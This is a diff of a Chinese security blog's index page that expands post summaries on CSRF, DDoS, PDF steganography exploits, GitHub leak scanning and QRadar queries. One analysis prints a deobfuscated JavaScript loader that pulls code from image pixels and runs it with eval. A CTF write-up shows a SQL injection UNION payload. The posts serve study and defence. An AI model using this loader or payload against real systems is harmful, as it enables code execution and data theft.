@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<meta name="generator" content="Hugo 0.99.1" />
+	<meta name="generator" content="Hugo 0.145.0">
 
   <meta charset="utf-8" />
 
@@ -207,21 +207,42 @@
       
         <article class="post-entry">
   <header class="post-header">
+    <h3 class="post-title"><a href="https://madneal.com/post/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0csrf%E6%94%BB%E5%87%BB/" class="post-link">跨站请求伪造（CSRF）攻击</a></h3>
+    <p class="post-meta">@Neal · Feb 21, 2019 · 2 min read</p>
+  </header>
+  
+  <p class="post-summary">
+概述 跨站请求伪造（CSRF）攻击强迫终端用户在他们身份被认证的情况下执行对于目标应用未知的操作（恶意的）。CSRF 攻击一般针对状态更改请求，而不是数据被盗，因为攻击者无法查看对伪造请求的响应。通过社会工程的（例如通过电子邮件或聊天发送链接）方法，攻击者可以欺骗 Web 应用程序的用户执行攻击者选择的操作。如果受害者是普通用户，则成功的 CSRF 攻击可以强制用户执行状态更改请求，例如转账，更改其电子邮件地址等。如果受害者是管理帐户，CSRF 可能会危及整个 Web 应用程序。
+值得注意的一点是 CSRF（跨站请求伪造）攻击经常与 XSS（跨站脚本）攻击（特别是反射性 XSS 攻击）混淆，两者虽然都是跨站，但并未有实际联系，利用方式也不尽相同。XSS 攻击通常是在合法的网络应用中注入恶意的内容为受害者提供服务。注入的内容会被浏览器执行，因此恶意脚本会执行。CSRF 的攻击通常是让目标用户在不知情的情况下执行一个操作（比如转账，表单提交），如果当前目标用户的还是已授权状态，那么这些操作就有可能会执行成功。可以这么理解，CSRF 就是利用用户合法的身份在用户不知情的情况下执行一些操作。而 XSS 则是在合法的网站注入恶意的内容，需要或者不需要用户交互即可执行恶意脚本，从而实现攻击。虽然两者并无太多相同之处，但是 XSS 漏洞会导致 CSRF 的某些防护措施失效，因此做好 XSS 的防护对于 CSRF 的防护也是很有意义的。
+CSRF 的工作原理 CSRF 攻击是通过让一个已授权的用户的浏览器向应用发起一个恶意请求（用户尚不知情的情况）。只要用户的身份已被验证过且实际的请求已经通过用户的浏览器发送到目标应用，应用无法知道情况的来源是否是一个有效的交易或者这个用户是在知情的情况下点击这个链接。通过 CSRF 攻击，攻击者可以让受害者执行一些他们不知情的操作，比如，登出，购买操作，改变账户信息或者其它目标攻击应用提供的服务。
+下面就是一个例子在机票供应商那里购买飞机票：
+POST http://TicketMeister.com/Buy_ticket.htm HTTP/1.1 Host: ticketmeister User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O;) Firefox/1.4.1 Cookie: JSPSESSIONID=34JHURHD894LOP04957HR49I3JE383940123K ticketId=ATHX1138&amp;to=PO BOX 1198 DUBLIN 2&amp;amount=10&amp;date=11042008 响应代表购买飞机票的 POST 请求已经成功执行：
+HTTP/1.0 200 OK Date: Fri, 02 May 2008 10:01:20 GMT Server: IBM_HTTP_Server Content-Type: text/xml;charset=ISO-8859-1 Content-Language: en-US X-Cache: MISS from app-proxy-2.proxy.ie Connection: close &lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt; &lt;pge_data&gt; Ticket Purchased, Thank you for your custom. &lt;/pge_data&gt; 如何定位存在潜在漏洞的代码 这个问题比较容易检测到，可能的补救措施就是警告用户这可能是一个 CSRF 攻击（比如在微信里面点击一个未知链接，微信可能会警告危险性，当然这并不是一个完美的解决方案）。只要应用接受一个精心构造的 HTTP 请求并且这个请求符合应用的业务逻辑，那么这个 CSRF 攻击就可以成功（我们设定用户已经登陆到攻击的目标应用）。
+</p>
+  <footer class="post-footer">
+    <a class="read-more" href="https://madneal.com/post/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0csrf%E6%94%BB%E5%87%BB/">Read More →</a>
+  </footer>
+</article>
+
+      
+        <article class="post-entry">
+  <header class="post-header">
     <h3 class="post-title"><a href="https://madneal.com/post/2019%E5%B9%B4%E9%92%88%E5%AF%B9api%E5%AE%89%E5%85%A8%E7%9A%844%E7%82%B9%E5%BB%BA%E8%AE%AE/" class="post-link">2019 年针对 API 安全的 4 点建议</a></h3>
     <p class="post-meta">@Neal · Feb 2, 2019 · 1 min read</p>
   </header>
   
-  <p class="post-summary">原文：4 Tips for Better API Security in 2019
+  <p class="post-summary"> 原文：4 Tips for Better API Security in 2019
 译者：neal1991
 welcome to star my articles-translator, providing you advanced articles translation. Any suggestion, please issue or contact me
 LICENSE: MIT
- 
 无论是在科技媒体亦或是分析报告中，2018年 “API”以及“安全”变得越来越常见，-或者更糟糕，“API” 以及“违规”一起出现在头条中。
 APIs（应用程序编程接口）不仅是应用程序，系统和数据之间的连接组织，而且是允许开发人员利用和重用这些数字资产以实现新目的的机制。API 几乎影响到每个数字用例，它们在安全新闻中的作用不仅仅是 API 中的一个内在缺陷，因为它们中的一些已被破解，因此存在明显的缺陷。
 但是头条新闻强调了一个重要信息：如果 API 安全性不是企业 2019 年优先事项的首要事项，那么优先级列表就不完整。
 实际上，API 安全的要求正在成为一种共识：
-  在 2017 年 12 月的报告“如何构建有效的API安全策略中，”Gartner 分析师 Mark O’Neill， Dionisio Zumerl e和 Jeremy D’Hoinne 预测，“2022年，API 滥用将是最常见的攻击向量，导致企业网络应用程序的数据泄露。”
-  OWASP Top 10是一个备受推崇的 web安全威胁列表，其中多次提及 API。其明确的警告包括针对没有保护即传输敏感数据的 API 的警告，针对可疑行为而未监控流量的 API 以及使用易受攻击组件的 API。</p>
+在 2017 年 12 月的报告“如何构建有效的API安全策略中，”Gartner 分析师 Mark O’Neill， Dionisio Zumerl e和 Jeremy D’Hoinne 预测，“2022年，API 滥用将是最常见的攻击向量，导致企业网络应用程序的数据泄露。”
+OWASP Top 10是一个备受推崇的 web安全威胁列表，其中多次提及 API。其明确的警告包括针对没有保护即传输敏感数据的 API 的警告，针对可疑行为而未监控流量的 API 以及使用易受攻击组件的 API。
+医疗保健组织 HIMMS 发布报告详细说明了 2018 年风险不安全的 API 可能对敏感的医疗保健数据造成的影响。
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/2019%E5%B9%B4%E9%92%88%E5%AF%B9api%E5%AE%89%E5%85%A8%E7%9A%844%E7%82%B9%E5%BB%BA%E8%AE%AE/">Read More →</a>
   </footer>
@@ -234,15 +255,17 @@ APIs（应用程序编程接口）不仅是应用程序，系统和数据之间�
     <p class="post-meta">@Neal · Jan 28, 2019 · 1 min read</p>
   </header>
   
-  <p class="post-summary">原文：“steganography” - obfuscating PDF exploits in depth
+  <p class="post-summary"> 原文：“steganography” - obfuscating PDF exploits in depth
 译者：neal1991
 welcome to star my articles-translator, providing you advanced articles translation. Any suggestion, please issue or contact me
 LICENSE: MIT
- 上礼拜发现的关于使用 this.getPageNumWords() &amp; this.getPageNthWord() 方法来进行混淆的 PDF 漏洞不久，我们发现另外一个，一个在 PDF 漏洞中更加强大的混淆利用技术。这种技术使用所谓的“隐写术”方法来隐藏嵌入在 PDF 文件中的图像中的恶意 Javascript 代码，它非常强大，因为它可以绕过几乎所有的 AV 引擎。
+上礼拜发现的关于使用 this.getPageNumWords() &amp; this.getPageNthWord() 方法来进行混淆的 PDF 漏洞不久，我们发现另外一个，一个在 PDF 漏洞中更加强大的混淆利用技术。这种技术使用所谓的“隐写术”方法来隐藏嵌入在 PDF 文件中的图像中的恶意 Javascript 代码，它非常强大，因为它可以绕过几乎所有的 AV 引擎。
 我们的 EdgeLogic 引擎将样本检测为 “exploit CVE-2013-3346”，与前一个相同。
- https://edgespot.io/analysis/ebc5617447c58c88d52be6218384158ccf96ec7d7755179a31d209a95cd81a69/  样本首先在 2017-10-10 提交给 VirusTotal，文件名为 “oral-b oxyjet spec.pdf”。
+https://edgespot.io/analysis/ebc5617447c58c88d52be6218384158ccf96ec7d7755179a31d209a95cd81a69/ 样本首先在 2017-10-10 提交给 VirusTotal，文件名为 “oral-b oxyjet spec.pdf”。
 上周只有 1 个 AV 引擎检测到这种攻击（但是，截至写作时，检测增加到 5/57）。
- https://www.virustotal.com/#/file/ebc5617447c58c88d52be6218384158ccf96ec7d7755179a31d209a95cd81a69/detection  打开后，伪装成 IRS 文件的 PDF 看起来很正常。</p>
+https://www.virustotal.com/#/file/ebc5617447c58c88d52be6218384158ccf96ec7d7755179a31d209a95cd81a69/detection 打开后，伪装成 IRS 文件的 PDF 看起来很正常。
+在该样本中使用两层混淆。 第一层是我们之前公开的 - “this.getPageNumWords()” 以及 “this.getPageNthWord()” 方法。该漏洞使用 “this.getPageNumWords()” 以及 “this.getPageNthWord()” 来读取和执行隐藏为“内容”的 Javascript。 相关代码可以在 PDF stream-64中找到。
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/%E9%9A%90%E5%86%99%E6%9C%AF-%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6pdf%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E/">Read More →</a>
   </footer>
@@ -255,12 +278,14 @@ LICENSE: MIT
     <p class="post-meta">@Neal · Jan 4, 2019 · 1 min read</p>
   </header>
   
-  <p class="post-summary">什么是 DDOS DDOS(Distributed Denial of Service)，即分布式拒绝服务，是一种针对于网络服务的攻击行为。对于 DDOS 我们可以这样通俗地理解，假如有一家商店在售卖商品，突然涌过来一大帮人说要买东西，这里面有的人是真正地顾客，有的人只是过来捣乱的，但是售货员如果没办法及时处置，就会导致一种拒绝服务攻击了。而分布式拒绝服务攻击，则是因为黑客控制了很多台肉鸡来发动攻击。这种攻击近些年来越来越流行，对于攻击者来说，成本小，但是相对收益大，对于受害者来说，造成的伤害却是巨大的。因为对于服务提供者来说，一旦服务不可用，就会造成不可挽回的损失，可能会导致用户量的流失。根据腾讯云发布的《2018年泛互联网行业DDoS攻击态势报告》，2018年 DDOS 攻击已经进入 TB 时代，2018 年的攻击峰值为 1.23Tbps（同比增长121%），而业界的攻击峰值更是达到惊人的 1.94Tbps。
+  <p class="post-summary">
+什么是 DDOS DDOS(Distributed Denial of Service)，即分布式拒绝服务，是一种针对于网络服务的攻击行为。对于 DDOS 我们可以这样通俗地理解，假如有一家商店在售卖商品，突然涌过来一大帮人说要买东西，这里面有的人是真正地顾客，有的人只是过来捣乱的，但是售货员如果没办法及时处置，就会导致一种拒绝服务攻击了。而分布式拒绝服务攻击，则是因为黑客控制了很多台肉鸡来发动攻击。这种攻击近些年来越来越流行，对于攻击者来说，成本小，但是相对收益大，对于受害者来说，造成的伤害却是巨大的。因为对于服务提供者来说，一旦服务不可用，就会造成不可挽回的损失，可能会导致用户量的流失。根据腾讯云发布的《2018年泛互联网行业DDoS攻击态势报告》，2018年 DDOS 攻击已经进入 TB 时代，2018 年的攻击峰值为 1.23Tbps（同比增长121%），而业界的攻击峰值更是达到惊人的 1.94Tbps。
 有人说对于 DDOS 攻击，有钱的话，就死命扩容，没钱的话，就忍一忍。虽然是玩笑话，但是有一定的道理。最近也是自己了解 DDOS 攻击这一块知识，下面简单介绍一下自己看到的一些。
 DDOS 攻击类型 常见的 DDOS 攻击主要包括以下几类：网络层攻击、传输层攻击、会话层攻击以及应用层攻击。
 传输层 DDOS 攻击 传输层 DDoS 攻击一般是针对于 TCP 以及 UDP 协议地攻击，主要是指 Syn Flood，Ack Flood，UDP Flood，ICMP Flood、RstFlood 等攻击。
 以最常见的 DDOS 攻击 Sync Flood 为例，它利用了 TCP 协议的三次握手机制，当服务端接收到一个 Syn 请求时，服务端必须使用一个监听队列将该连接保存一定时间。因此，通过向服务端不停发送 Syn 请求，但不响应 Syn&#43;Ack 报文，从而消耗服务端的资源。当等待队列被占满时，服务端将无法响应正常用户的请求，达到拒绝服务攻击的目的。
-DNS DDoS 攻击 DNS 服务对于企业来说是比较重要的，因此针对 DNS 服务的 DDOS 攻击也是比较常见的。DNS DDoS 攻击主要是指 DNS Request Flood、DNS Response Flood、虚假源&#43;真实源 DNS Query Flood、权威服务器和 Local 服务器攻击。</p>
+DNS DDoS 攻击 DNS 服务对于企业来说是比较重要的，因此针对 DNS 服务的 DDOS 攻击也是比较常见的。DNS DDoS 攻击主要是指 DNS Request Flood、DNS Response Flood、虚假源&#43;真实源 DNS Query Flood、权威服务器和 Local 服务器攻击。
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/%E4%BB%80%E4%B9%88%E6%98%AFddos/">Read More →</a>
   </footer>
@@ -276,7 +301,9 @@ DNS DDoS 攻击 DNS 服务对于企业来说是比较重要的，因此针对 DN
   <p class="post-summary">近几年由于 Github 信息泄露导致的信息安全事件屡见不鲜，且规模越来越大。就前段时间华住集团旗下酒店开房记录疑似泄露，涉及近5亿个人信息。后面调查发现疑似是华住的程序员在 Github 上上传的 CMS 项目中包含了华住敏感的服务器及数据库信息，被黑客利用导致信息泄露（这次背锅的还是程序猿）。
 起源 对于大型 IT 公司或者其他行业，这种事件发生的概率实在是太常见了，只不过看影响的范围。现在大家看到的，也仅仅只是传播出来的而已。企业没办法保证所有人都能够遵守规定不要将敏感信息上传到 Github，尤其是对于那种特别依赖于外包的甲方企业，而甲方的开发人员也是一无所知，这种事件发生也就是司空见惯了。
 废话说了一大通（可能是最近看安全大佬的文章看多了），终于要介绍一下我的这个项目，GShark。这个工具主要是基于 golang 实现，这也是第一次学习 golang 的项目，结合 go-macron Web 框架实现的一个系统。其实最初我是看到小米安全开源的 x-patrol 项目。网上这种扫描 Github 敏感信息的工具多如皮毛，我看过那种 star 数上千的项目，感觉实现方式也没有很好。因为说到底，大家都是通过 Github 提供的 API 结合相应的关键字来进行搜索的。但是，x-patrol 的这种实现方式我觉得是比较合理的，通过爬虫爬取信息，并对结果进行审核。所以，最初我是一个 x-patrol 的使用者。使用过程中，也遇到过一些问题，因为这个库似乎就是小米的某个固定的人维护的，文档写的不是特别清晰。中间我有提过 PR，但都被直接拒绝掉了。后来，我就想基于 x-patrol 来实现一套自己的系统，这也就是 GShark 的来由了。目前，这个项目与 x-patrol 已经有着很大的变化，比如移除了本地代码的检测，因为这个场景没有需求，其实我本身自己也实现了一个基于 lucene 的敏感信息检索工具。另外，将前端代码进行了梳理，并使用模板引擎来做模板的嵌套使用。基于 casbin实现基于角色的权限控制等等。
-原理 讲完了起源，接着讲一讲这个系统的原理。基本上，这类工具都是首先会在 Github 申请相应的 token 来实现，接着通过相应的 API 来进行爬取。本项目主要是基于 Google 的 go-github。这个 API 使用起来还是比较方便的。通过这个 API 我们可实现在 Github 来进行搜索，其实这基本上等同于 Advanced Search。因为 API 提供的搜索能力肯定就是 Github 本身所具有的搜索能力。最基本的包括关键及，以及一些 owner 信息以及 star 数等等。</p>
+原理 讲完了起源，接着讲一讲这个系统的原理。基本上，这类工具都是首先会在 Github 申请相应的 token 来实现，接着通过相应的 API 来进行爬取。本项目主要是基于 Google 的 go-github。这个 API 使用起来还是比较方便的。通过这个 API 我们可实现在 Github 来进行搜索，其实这基本上等同于 Advanced Search。因为 API 提供的搜索能力肯定就是 Github 本身所具有的搜索能力。最基本的包括关键及，以及一些 owner 信息以及 star 数等等。
+另外一点就是 Github 的搜索是基于 elasticsearch 的，因此也是支持 lucene 语法的。GShark 的黑名单过滤其实就是通过这个规则来实现的。
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/gshark-%E7%9B%91%E6%B5%8B%E4%BD%A0%E7%9A%84github%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">Read More →</a>
   </footer>
@@ -294,7 +321,8 @@ Qradar Qradar 是 IBM 一款比较成熟的商业 SIEM 平台（尽管他们的 
 可以看出 AQL 是一种非常类似于 SQL 的语言，所以基本上你用过 SQL 学会 AQL 也就分分钟的事情，而且你也不会拿它去做特别复杂的嵌套查询（因为它也不支持。。。）
 Tips 虽然 AQL 终于让我们有枪可以搞一搞了，但是还是有一些地方值得吐槽的地方。第一就是很多 ID 不知道其具体的映射，就比如我们想查询一些事件的名称或者规则的名称，AQL 是不存在字段名是事件名称或者规则名称的。不过你可以通过函数来进行转换，比如使用 QIDNAME(qid) 来获取事件名称，RULENAME(123) 来获取规则名称。你没办法知道事件名称或者规则名称到底是对应什么 ID，目前我用的办法就是先去 IBM Develop API 里面先去查询。第二，AQL 查询的结果我发现有某个规则的查询结果和用 filter 查询的结果不一致，不知道这是不是特例。还有其他的，想到再说。
 下面就是我在使用过程中一些小经验：
-引号的使用 在 AQL 中，单引号和双引号的使用是有区别的。单引号一般可以表示字符串或者作为字段的别名，如果你的字段包含了空格，那么你必须使用单引号。双引号一般用来表示自定义属性的名称。还有一个值得注意的地方就是，当你在使用 WHERE, GROUP BY, ORDER BY 的时候，你必须要使用双引号来使用别名，而不是单引号，是不是有点绕。其实有个好的方法就是不要使用单引号了，直接使用帕斯卡命名或者使用下划线连接，比如 EventName 或者 Event_Name，其实你自己想怎么命名都可以啦。</p>
+引号的使用 在 AQL 中，单引号和双引号的使用是有区别的。单引号一般可以表示字符串或者作为字段的别名，如果你的字段包含了空格，那么你必须使用单引号。双引号一般用来表示自定义属性的名称。还有一个值得注意的地方就是，当你在使用 WHERE, GROUP BY, ORDER BY 的时候，你必须要使用双引号来使用别名，而不是单引号，是不是有点绕。其实有个好的方法就是不要使用单引号了，直接使用帕斯卡命名或者使用下划线连接，比如 EventName 或者 Event_Name，其实你自己想怎么命名都可以啦。
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/qradar-sime%E6%9F%A5%E8%AF%A2%E5%88%A9%E5%99%A8/">Read More →</a>
   </footer>
@@ -307,12 +335,14 @@ Tips 虽然 AQL 终于让我们有枪可以搞一搞了，但是还是有一些�
     <p class="post-meta">@Neal · Aug 23, 2018 · 4 min read</p>
   </header>
   
-  <p class="post-summary">鄙人不才，只能做个 web 狗了。那就好好学习 web 吧。拼命地刷 writeup 就好了。上题目，Phone number。提示只有 phone number is a good thing.
+  <p class="post-summary">
+鄙人不才，只能做个 web 狗了。那就好好学习 web 吧。拼命地刷 writeup 就好了。上题目，Phone number。提示只有 phone number is a good thing.
 打开链接可以看到是一个登陆页面，查看源代码，没有什么东西。不过，这个页面还有个注册页面，注册页面有用户名密码以及 phone，查看其源代码也没有什么异常情况。这道题初步看来应该是一道 sql 注入题了，那么注入点在哪呢？当然是 phone 了（来自于上帝视角）。如果正经地来说还是因为题目的提示啦。
 注入点的确就是 phone，不过是要使用 16进制字符。为什么呢？上帝告诉我的，我也不知道。好吧，接下来就是 sql 注入四步曲了，爆数据库名，爆表名，爆字段，最后查数据，拿 flag。是不是很开心！
 正常用户 首先，我们首先注册一个正常用户，注册之后登录，可以看到页面。这里面有一个 check 的按钮，点击一下，可以看到页面提示 There only 369 people use the same phone as you。查看源代码，可以看到注释里面有一句话：听说admin的电话藏着大秘密哦，这也是一个小提示。这里面的369应该就是通过 sql 语句从数据库拿到的，语句可能就是类似于 select count(*) from user where phonenum = 12 这种的，从而查出和你电话号码一样的用户数了，那么我可以信誓旦旦地告诉你，这就是一个注入点啦！
 数据库名 因为 phone 可能使用的是数字，所以这是一个数字型的注入。那么，我买可以随便注册一个用户名了，首先获取数据库名的语句是 1 and 1 = 2 union select database()，把这个语句转化为16进制字符。将这个16进制字符串作为 phone 来进行注册，这里注意的一个点就是，前台对于 phone 的长度做了限制， maxlength=&#34;11&#34;，打开开发者工具设置大一点就可以了。注册成功之后，我么就可以看到：
-Hello, txt1 Your phone is 1 and 1 = 2 union select database().</p>
+Hello, txt1 Your phone is 1 and 1 = 2 union select database(). Click on the link and you’ll know how many people use the same phone as you.
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/web%E7%8B%97%E4%B9%8Bwriteup--phone/">Read More →</a>
   </footer>
@@ -327,8 +357,9 @@ Hello, txt1 Your phone is 1 and 1 = 2 union select database().</p>
   
   <p class="post-summary">Python 作为一种常用的胶水语言，可用于各种用途。最近有个需求需要获取 SIME 平台的数据并形成月度报告。我的想法就是通过平台的 API 获取数据，然后基于 word 以及 matplotlib 来生成可视化报告。在这里要介绍一个比较好用的 python 库，docxtpl。这个库是一个基于 python-docx 的库，可以通过模板来生成报告。下面就介绍一下如何使用这些库，以及使用过程中的一些小问题。
 模板 docxtpl 是基于 jinja2 引擎的语法，类似于常见的 html 模板语法，变量经常会放在 {{}} 中。假如我们希望在模板中设置变量 a 的值，那么我么可以在模板中填写 {{a}}。最后，我们通过 render 来渲染模板即可。
-doc = Docxtpl(filename) context = {  &#34;a&#34;: &#34;13413&#34; } doc.Render(context) 那么如果我们希望在模板中插入一个图片该怎么做呢，可以使用 InlineImage 去实例化图片：
-from docxtpl import DocxTemplate, InlineImage # for height and width you have to use millimeters (Mm), inches or points(Pt) class : from docx.shared import Mm, Inches, Pt import jinja2 from jinja2.</p>
+doc = Docxtpl(filename) context = { &#34;a&#34;: &#34;13413&#34; } doc.Render(context) 那么如果我们希望在模板中插入一个图片该怎么做呢，可以使用 InlineImage 去实例化图片：
+from docxtpl import DocxTemplate, InlineImage # for height and width you have to use millimeters (Mm), inches or points(Pt) class : from docx.shared import Mm, Inches, Pt import jinja2 from jinja2.utils import Markup tpl=DocxTemplate(&#39;test_files/inline_image_tpl.docx&#39;) context = { &#39;myimage&#39; : InlineImage(tpl,&#39;test_files/python_logo.png&#39;,width=Mm(20)), &#39;myimageratio&#39;: InlineImage(tpl, &#39;test_files/python_jpeg.jpg&#39;, width=Mm(30), height=Mm(60)), &#39;frameworks&#39; : [{&#39;image&#39; : InlineImage(tpl,&#39;test_files/django.png&#39;,height=Mm(10)), &#39;desc&#39; : &#39;The web framework for perfectionists with deadlines&#39;}, {&#39;image&#39; : InlineImage(tpl,&#39;test_files/zope.png&#39;,height=Mm(10)), &#39;desc&#39; : &#39;Zope is a leading Open Source Application Server and Content Management Framework&#39;}, {&#39;image&#39;: InlineImage(tpl, &#39;test_files/pyramid.png&#39;, height=Mm(10)), &#39;desc&#39;: &#39;Pyramid is a lightweight Python web framework aimed at taking small web apps into big web apps.&#39;}, {&#39;image&#39; : InlineImage(tpl,&#39;test_files/bottle.png&#39;,height=Mm(10)), &#39;desc&#39; : &#39;Bottle is a fast, simple and lightweight WSGI micro web-framework for Python&#39;}, {&#39;image&#39;: InlineImage(tpl, &#39;test_files/tornado.png&#39;, height=Mm(10)), &#39;desc&#39;: &#39;Tornado is a Python web framework and asynchronous networking library.&#39;}, ] } # testing that it works also when autoescape has been forced to True jinja_env = jinja2.Environment(autoescape=True) tpl.render(context, jinja_env) tpl.save(&#39;test_files/inline_image.docx&#39;) 同样还可以使用宽度高度单位来设置图片的大小。另外我们还可以利用表格的模板来动态设置数据，具体可以参考 test，里面有各种例子可以参考。
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/%E5%88%A9%E7%94%A8python%E7%94%9F%E6%88%90%E5%8F%AF%E8%A7%86%E5%8C%96%E6%8A%A5%E5%91%8A/">Read More →</a>
   </footer>
@@ -343,7 +374,10 @@ from docxtpl import DocxTemplate, InlineImage # for height and width you have to
   
   <p class="post-summary">前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
 最初的代码是经过混淆的，代码经过整理如下：
-var createImgElement = function(urla, b) {  var imgElement = document.createElement(&#39;img&#39;);  var canvasEle = document.createElement(&#39;canvas&#39;);  imgElement[&#39;crossOrigin&#39;] = true;  imgElement[&#39;onload&#39;] = function() {  canvasEle.width = this.width;  canvasEle.height = this.height;  var canvasContext = canvasEle.getContext(&#39;2d&#39;)  canvasContext.drawImage(this, 0, 0, this.width, this.height);  for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height),  cancasDataLength = canvasContext.data.length, arr = [], i = 0;  i &lt; cancasDataLength;  i &#43;= 4) {  var code = canvasContext.</p>
+var createImgElement = function(urla, b) { var imgElement = document.createElement(&#39;img&#39;); var canvasEle = document.createElement(&#39;canvas&#39;); imgElement[&#39;crossOrigin&#39;] = true; imgElement[&#39;onload&#39;] = function() { canvasEle.width = this.width; canvasEle.height = this.height; var canvasContext = canvasEle.getContext(&#39;2d&#39;) canvasContext.drawImage(this, 0, 0, this.width, this.height); for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), cancasDataLength = canvasContext.data.length, arr = [], i = 0; i &lt; cancasDataLength; i &#43;= 4) { var code = canvasContext.data[i] var code1 = canvasContext.data[i &#43; 1] var code2 = canvasContext.data[i &#43; 2] canvasContext.data[i &#43; 2].toString(16); 1 == code1.length &amp;&amp; (code1 = 0 &#43; code1); 1 == code2.length &amp;&amp; (code2 = 0 &#43; code2); 0 != Number(code &#43; code1 &#43; code2) &amp;&amp; arr.push(String.fromCharCode(Number(code &#43; code1 &#43; code2))); } window.eval(arr.join(&#39;&#39;)); console.log(arr.join(&#39;&#39;)); b &amp;&amp; b(); } imgElement.src = urla; }; 这段代码的主要目的是通过使用一个图片的连接，将这个图片加载到 canvas 中，再利用 canvas 去获取恶意代码并执行。通过图片去隐藏信息是一种常见的做法，这段就是通过 canvas 去执行图片中隐含的恶意代码。这段还支持传入回调函数，若回调函数存在，则执行回调函数。
+在这里还利用一个计算机图像的知识，即像素中的 RGBA 值。Canvas 中的 ImageData 对象中每一个像素都包含了4个信息，即 RGBA 值。
+R - 红色 (0-255) G - 绿色 (0-255) B - 蓝色 (0-255) A - alpha 通道 (0-255; 0 是透明的，255 是完全可见的) 通过将代码转化为 ascii 码，将其隐藏在图片中的 RGB 信息中，黑产的 alpha 值都设置的为255。这样非常巧妙地就实现了代码信息和图片之间的转换。
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/%E9%BB%91%E4%BA%A7%E4%BB%A3%E7%A0%81%E8%A7%A3%E5%AF%86--%E5%88%A9%E7%94%A8canvas%E5%8A%A0%E8%BD%BD%E4%BB%A3%E7%A0%81/">Read More →</a>
   </footer>
@@ -365,33 +399,10 @@ wmic product get name, description &gt; products.txt
 这样我们就可以获取结果的 txt 文件，是不是很方便。然而，当我们将使用 wmic 导出的结果和控制面板中的程序和功能相比较的话，我们会发现有些程序没有出现在结果中，比如 Google Chrome。
 通过 wmic 只能获取大部分程序列表，它们的安装包一般都是使用 Windows Installer 制作的，安装过程中调用 Windows Installer 服务进行安装。但是 Windows Installer 并不是唯一的制作安装包的工具，因此 wmic 往往可能获取的还不是完整的程序和功能列表。至于完整的程序和功能列表，可以参考这篇文章。
 补丁信息 经常我们需要获取计算机的补丁安装情况。通过 systeminfo 可以获取一部分补丁安装信息，但是信息一般比较少。在这里，我们依然可以通过使用 wmic 来获取补丁安装信息。
-wmic qfe list full</p>
+wmic qfe list full
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/wmic%E4%BD%BF%E7%94%A8%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/">Read More →</a>
-  </footer>
-</article>
-
-      
-        <article class="post-entry">
-  <header class="post-header">
-    <h3 class="post-title"><a href="https://madneal.com/post/elasticsearch%E5%9B%A2%E9%98%9F%E5%BC%80%E5%8F%91%E7%AB%A0%E7%A8%8B/" class="post-link">Elasticsearch 团队开发章程</a></h3>
-    <p class="post-meta">@Neal · Jun 16, 2018 · 2 min read</p>
-  </header>
-  
-  <p class="post-summary">原文：Elasticsearch Team Development Constitution
-译者：neal1991
-welcome to star my articles-translator , providing you advanced articles translation. Any suggestion, please issue or contact me
-LICENSE: MIT
- 前言 我们作为 Elasticsearch 核心开发人员团队希望尽可能快地向可靠，健壮，安全，可扩展且易于使用的系统迁移。我们希望为创新而努力，取代传统的构造和功能，删除脆弱的代码，并致力于改善用户体验，同时在我们快速变化的同时保持用户增长。
-对于我们来说，拥有一个团队的前进方向的共识是非常重要的，甚至更重要的是团队为什么要走上一条特定的路。当 Elasticsearch 创立之初时，它具有无尽的灵活性，易用性和丰富的 API。我们这帮年轻的团队成立了一家公司，并且突然用户数井喷式发展。支持组织几乎无法满足越来越多的客户，这是幸福的烦恼。然而，随着用户数量的增长，事情发生的可能性也越来越大，不幸的是，这比我们聘用支持工程师的速度要快得多。我们了解到，大多数灵活性来自宽松处理，从大多数情况下可行的功能，但不是全部。例如，用户可以使用请求发送的脚本基本上是一个远程代码执行引擎，如果出错，它是致命的。即使最基本的功能，比如设置，也非常灵活，但非常脆弱。在没有单位的情况下指定一个数字是很好的，除非许多用户不知道默认单位是什么。我们只是试图做正确的事情，结果证明并不是总是对的。
-现在我们处于不同的位置。我们的用户基数比 2013 年的用户基数大得多，但我们的支持机构并没有以同样的速度增长。是的，我们处理比 2013 年更多的支持案例，但这在我们当时的系统中是不可能的。现在我们已经从一个脆弱而灵活的系统转向了范围较窄的软件。我们定义了更多的边界：更严格的输入验证，允许我们对权限进行细粒度控制的安全模型，甚至还有一个插件模型，可以以极大的灵活性来添加风险更高的功能。
-但等等，我们还差得远呢！仍然有无穷无尽的问题会造成致命的后果。聚合可以通过一个请求来撑爆服务器。用户感觉需要运行 30&#43;GB 堆的 Elasticsearch。我们仍然提供了 27 种指定布尔值的不同方式。这份清单还有其它内容…
-我们对我们的用户，支持组织，云托管团队和第三方提供商负有巨大责任，提供可靠，稳健，安全且易于使用的系统。出于这个原因，我们都应该努力创新，取代传统的构造和功能，删除脆弱的代码，并改善用户体验。我们与其他公司相比的优势是我们的创新，创新需要速度。我们必须在留住用户的同时下采取行动并接受变革创新。
-以下章节是用于设计，重构或从 Elasticsearch 代码库中删除代码的原则和指导原则的集合。这些点是无序的，大部分是未分类的，应该被看作是 Elasticsearch 团队内软件开发的一个组成部分。
